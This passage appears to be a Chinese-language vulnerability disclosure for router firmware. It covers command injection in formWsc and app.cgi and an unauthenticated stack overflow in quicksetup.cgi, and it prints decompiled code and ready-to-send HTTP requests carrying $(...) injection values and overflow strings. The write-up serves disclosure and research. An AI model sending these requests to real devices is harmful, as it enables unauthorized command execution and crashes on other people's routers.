 formWsc 组件 localPin/targetAPSsid/peerPin 命令注入

## 漏洞描述

`/boafrm/formWsc` 的 WPS 配置(隐藏 API,web 界面不存在,手工 POST 触发)。`localPin`、`targetAPSsid`(转义函数只转义3字符漏 `$`)、`peerPin`/`peerRptPin`(14.x)均拼入 `system()`。

## 漏洞详情

**受影响组件**: `/boafrm/formWsc`

**受影响函数**: `sub_461078`;转义缺陷 `sub_434750`

**数据流向**: 

	转义函数sub_434750规则分析，没有转义$

```c
switch (v3) {
    case '\\':  // 反斜杠
        *v1 = 92;    // 反斜杠 '\'
        v1[1] = 92;  // 反斜杠 '\'
        // 输出：\\  (转义后的反斜杠)
        break;
        

    case '"':   // 双引号
        *v1 = 92;    // 反斜杠 '\'
        v1[1] = 34;  // 双引号 '"'
        // 输出：\"  (转义后的双引号)
        break;
        
    case '`':   // 反引号
        *v1 = 92;    // 反斜杠 '\'
        v1[1] = 96;  // 反引号 '`'
        // 输出：\`  (转义后的反引号)
        break;

}
```

	获取输入 `localPin`/`targetAPSsid`/`peerPin`/`peerRptPin`

![58.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzxuhsrcijurwys1.png)

拼接模板(单引号/无引号/双引号)

![59.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzxwzltvfusmc2uz.png)

命令执行`system`

## 请求包

![60.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzxzqnmrzsifqalr.png)

```bash
POST /boafrm/formWsc HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=RewGo2a47f5edn8Etlu/usAW

Connection: close

Content-Length: 78

submit-url=/wlwps.htm&triggerPIN=1&targetAPSsid=$(echo PWNED>/var/tmp/pwn55)
```

![61.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzy3psz8gtbnbdgm.png)

# CVE-2026-71956

app.cgi 组件 netDig.ping.dst 命令注入

## 漏洞描述

手机 App 私有 JSON API `/app/app.cgi`,`netDig.ping.dst` 仅长度校验(3≤len≤63),无过滤;`snprintf("ping -c %d -W 3 %s 2>&1")` 再到 `popen()`命令执行(/bin/sh 解释 `$()`)。`REMOTE_ADDR=127.0.0.1` 免登录。

## 漏洞详情

**受影响组件**: `/app/app.cgi`

**受影响函数**: `sub_402990` ，原本是用于执行ping命令并返回结果

**数据流向**: 

	获取输入 `netDig、ping、dst`

​	

![62.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzyfhr5kgsz3q4hb.png)
	过滤(3≤strlen<0x3D)

![63.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzyijoy6k9a8pe8y.png)

	拼接 `ping -c %d -W 3 %s 2>&1`，执行`popen`

![64.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzyl8mfwtuiaq88w.png)

## 请求包

![65.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzyove5t4hvk4kjh.png)

```http
POST /app/app.cgi HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=RewGo2a47f5edn8Etlu/usAW

Connection: close

Content-Length: 80

{"action":"get","netDig":{"ping":{"dst":"$(echo OK>/var/tmp/pwn56)","count":1}}}
```

![66.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzysikdjpboyvjd5.png)

# CVE-2026-71958

quicksetup.cgi 组件栈溢出

## 漏洞描述

`/quicksetup.cgi`（未认证直达）的快速向导处理存在栈缓冲区溢出漏洞。`main`（0x40aa38）将原始 query string 交给 `sub_40A3A4`（test4?2? 分支），该函数在栈上定义了两个固定大小 256 字节的缓冲区 v5/v4（main 栈帧）。程序使用 `strcpy` 将 query 中 "test4?2?" 之后的全部剩余字节直接拷入 v5，无长度检查。当 query 超过248字节时，越界写入覆盖 main 保存的 `$fp`（偏移 248）与 `$ra`（偏移 252）。并且 setWiFi/ssid2 分支sub_40A798与 Apply/username 分支存在多级 strcpy 溢出。

## 漏洞详情

**漏洞函数**：`sub_40A3A4`（0x40a3a4，处理 test4?2? 分支）；`main`（0x40aa38，分发）

**漏洞点**：`strcpy(v5, strstr(argv[1],"test4?2?")+8)`（调用点 0x40a414）

**触发参数**：GET/POST 的 query string（如 `test4?2?AAAA...`），经 boa `sub_40520C` 原样放入 `argv[1]`

**无需认证：**（boa `sub_40B34C` 白名单含 quicksetup.cgi，跳过登录跳转）；query 非空即可

![67.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzz5akazlsvhdwfa.png)

**受影响代码片段（sub_40A3A4）**：

main函数分发test4和setwifi

![68.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzz9ivuy5baj8gg4.png)

![69.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzzc5211xabihjr6.png)

```c
// main (0x40aa38)
int main(int argc, char **argv)
{
    _BYTE v4[256];  //溢出缓冲区
    _BYTE v5[256];  //漏洞缓冲区, 大小 256 字节
    if (argc < 2) return 0;
    // 分发test
    if (strstr(argv[1], "test4"))            // test4 分支
        sub_40A3A4(argv[1], v5, v4);         
    if (strstr(argv[1], "setWiFi"))          // setWiFi 分支
        sub_40A798(argv[1]);                 
}

// sub_40A3A4 (0x40a3a4)
int sub_40A3A4(char *argv1, char *a2, char *a3)
{
    char *p;
    p = strstr(argv1, "test4?2?");           // 定位到 "test4?2?" (8 字节)
    if (p)
    {
        // 剩余 248 字节;超过即溢出
        strcpy(a2, p + 8);                   // 0x40a414: 剩余全部字节v5[256]溢出
        p = strchr(a2, '?');                 // 切分第二段值
        if (p)
        {
            strcpy(a3, p + 1);               // 0x40a44c: 第二段v4[256]溢出
            // ...
        }
    }
}
```

![70.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzzjcjpnyyooodal.png)
其实直接260个A字符就可以造成溢出，这里的栈空间最多也就是256字节

**利用链**：正常请求 `GET /quicksetup.cgi?test4=AAAA` 返回 HTTP 200 并回显 `@@@@test4_OK`（handler 真实执行 sysconf restartWan）；发送 260 个 'A' 的溢出 payload 后，服务器返回 HTTP 000（连接被重置）/ HTTP 500，证实栈缓冲区溢出导致 CGI 进程崩溃。

## 请求包（不需要认证直接访问接口）

```bash
GET /quicksetup.cgi?test4?2?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: 192.168.135.132
Connection: close

GET /quicksetup.cgi?Apply?admin_skipFlag=0&&&username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&&&password=x HTTP/1.1
Host: 192.168.135.132
Connection: close

GET /quicksetup.cgi?setWiFi?ssid2=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: 192.168.135.132
Connection: close
```

输入260个A程序崩溃

![71.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzzwjtw1xwreqdzp.png)

![72.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr001nsh7zh7ssrxb.png)

![73.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr004611g1bo8npcv.png)

输入较短字符串与之前对比

![74.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr0087md3z8vpopjg.png)

![75.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr00jfgsbcapzapei.png)

![76.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr00mkoebwg0xksag.png)

	说明栈溢出漏洞确实存在
